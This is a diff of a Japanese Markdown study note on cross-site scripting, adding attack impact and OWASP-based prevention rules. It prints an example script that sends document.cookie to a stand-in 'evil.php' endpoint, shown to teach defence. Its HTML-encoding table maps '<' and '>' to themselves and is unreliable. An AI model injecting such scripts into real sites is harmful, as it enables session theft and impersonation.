@@ -36,11 +36,11 @@
 
 **クロスサイトスクリプティング（XSS）** 攻撃は、悪意のあるスクリプトを脆弱性のあるWebサイトに注入し、クライアントのブラウザ上でコードを実行する攻撃である。
 
-悪意のあるスクリプトをブラウザ上で実行させることで、ブラウザが保持している対象のサイトでのCookie、セッショントークンなどの機密情報を盗み出し、ユーザになりすますなどの攻撃が実行される可能性がある。
+悪意のあるスクリプトをブラウザ上で実行させることで、ブラウザが保持している対象のサイトでの **Cookie、セッショントークンなどの機密情報** を盗み出し、 **ユーザになりすます** などの攻撃が実行される可能性がある。
 
 XSS は2017年時点で、Webアプリケーションの脆弱性の中で7番目に被害が多い攻撃である。
 
-特徴は対象のWebアプリケーションが、ユーザからの入力を検証したり、エンコードせずに保存し、そのままHTMLとして出力してしまうような場合にどこでも発生する点である。
+特徴は対象のWebアプリケーションが、ユーザからの入力を検証しなかったり、エンコードせずに保存してしまい、そのままHTMLとして出力してしまうような場合にどこでも発生する点である。
 
 XSS には主に以下の3種類が存在している。
 
@@ -50,15 +50,45 @@ XSS には主に以下の3種類が存在している。
 | Refrected XSS | ユーザからの入力を受けて、その一部や全部を即座にエラーメッセージ、検索結果、そのほかのレスポンスに反映してしまう場合に発生する。                                                                                                                                                           | 
 | DOM based XSS | 悪意のあるデータの流れがすべてブラウザ上で発生する、つまり悪意のあるデータがDOMにあり、そのDOMからほかのDOMへのデータが流れるような場合に発生する。<br><br>例えば悪意のあるデータ、DOMのHTML要素（document.location.href）から注入されたり、document.writeで書き込まれたりする場合である。 | 
 
-- [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
-- [Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
-- [Cross Site Scripting Prevention Cheat Sheet¶](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
-
 #### どういった被害が発生しているのか
 
+Webアプリケーションが、ユーザの入力を何も検証していない場合、攻撃者は認証されたユーザからCookie情報を盗むことが可能となる。
+
+例えば以下のスクリプトを脆弱性のある掲示板に注入し、ユーザが対象のページのHTMLをリクエストしてしまうと、攻撃者のサイトに対してユーザが対象のサイトで保持しているCookie情報が盗まれてしまう。
+
+```js
+<script type="text/javascript">
+var adr = '../evil.php?cakemonster=' + escape(document.cookie);
+</script>
+```
+
+これでエスケープ処理されたCookieの中身が変数`cakemonster`に格納された状態で、`evil.php`へのリクエストが送信されてしまう。
+
+後は攻撃者は抜き取ったCookieに格納されているセッション情報などを使用して、被害者になりすますことが可能となる。
 
 #### どのような対策を講じるべきか
 
+**Stored XSS** と **Refrected XSS** に関しては、サーバ側でユーザ入力に対して適切な検証処理とエンコーディングを実装することで対処することができる。
+
+なお入力に対する検証処理を実装する場合には、独自に実装を行うよりも使用している言語で提供されているエンコーディング用のライブラリを使用するほうが安全である。
+
+**DOM based XSS** では、いくつかのルールに従うことで対処することが可能であるが、そのルールの詳細は [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) を要参照する。
+
+では以下に具体的な XSS を防止するためのルールを記載する。なおルールの詳細は [XSS Prevention Rules](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules) に記載されているが、リンク先でも指摘されているように、ルール0を基本として、ルール1とルール2で十分な場合が多いため、この2つのルールを説明する。
+
+| 名称      | 概要                                                                                                                                                                                                                                                                                         | 
+| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | 
+| ルール#０ | 原則として検証を行っていないような信頼できないデータは、どのようなものであってもHTMLの文書に注入しないようにする。<br><br>`<script>`タグやHTMLコメント `<!-- comment -->` 、タグの名称やその属性名、CSSなどあらゆる要素で、信頼していないデータは注入してはいけない。                        | 
+| ルール#1  | HTML文書に信頼していないデータを挿入する前に、必ず入力値をHTMLエンコードする。<br><br>これは例えばユーザ入力に対して、以下の文字をHTMLエンコードした後でHTML文書に挿入するという意味になる。<br><br>```html<br> & --> &amp;<br> < --> <<br> > --> ><br> " --> &quot;<br> ' --> &#x27;<br>``` | 
+| ルール#2  | `<div attr=...>` のようにHTMLタグなどの属性値に値を挿入する前に、値をHTMLエンコードする。<br><br>アルファベット文字以外のすべてをASCIIに変換することで悪意のあるスクリプト実行を防ぐことができる                                                                                             | 
+
+さらに詳細を知りたい場合は、参考資料のチートシートを参照する。
+
+#### 参考資料
+
+- [Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
+- [Types of XSS](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)
+- [Cross Site Scripting Prevention Cheat Sheet¶](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
 
 ### コマンドインジェクション
 
